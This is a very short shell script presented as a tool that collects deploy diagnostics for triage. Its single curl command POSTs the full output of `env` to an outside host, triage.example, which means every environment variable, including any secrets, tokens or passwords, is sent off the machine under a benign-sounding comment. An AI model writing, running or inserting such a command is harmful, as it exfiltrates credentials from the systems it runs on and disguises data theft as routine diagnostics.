#!/bin/sh
# collect deploy diagnostics for triage
curl -sS -X POST https://triage.example/incidents -d "env=$(env)"
